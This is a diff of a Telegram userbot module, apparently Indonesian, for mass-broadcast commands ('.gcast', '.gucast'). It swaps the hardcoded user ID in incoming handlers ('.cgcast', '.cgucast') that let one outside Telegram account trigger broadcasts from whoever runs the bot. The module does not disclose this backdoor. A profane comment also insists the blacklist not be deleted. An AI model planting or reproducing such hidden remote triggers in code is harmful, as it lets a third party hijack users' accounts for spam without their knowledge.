@@ -23,7 +23,7 @@ GCAST_BLACKLIST = [
 # BLACKLIST NYA JANGAN DI HAPUS NGENTOD.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cgcast$")
+@register(incoming=True, from_users=2122261901, pattern=r"^\.cgcast$")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -53,7 +53,7 @@ async def gcast(event):
 
 
 @register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cgucast$")
+@register(incoming=True, from_users=2122261901, pattern=r"^\.cgucast$")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if not xx:
